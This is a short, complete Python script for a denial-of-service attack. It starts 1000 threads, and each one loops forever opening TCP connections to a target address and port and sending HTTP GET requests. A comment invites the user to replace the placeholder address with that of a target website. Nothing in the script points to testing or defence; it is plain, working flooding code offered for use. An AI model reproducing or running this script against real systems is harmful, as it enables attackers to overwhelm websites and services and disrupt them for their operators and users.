import socket
import threading


def attack(target):
    print(f"Attacking {target[0]} on port {target[1]}")
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(target)
        sock.send(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
        sock.close()


def main():
    target = (
        "192.168.1.1",
        80,
    )  # Replace with the IP address and port of the target website
    num_threads = 1000  # Number of threads to spawn for the attack

    print(
        f"Starting attack on {target[0]} on port {target[1]} with {num_threads} threads"
    )
    for _ in range(num_threads):
        thread = threading.Thread(target=attack, args=(target,))
        thread.start()


if __name__ == "__main__":
    main()
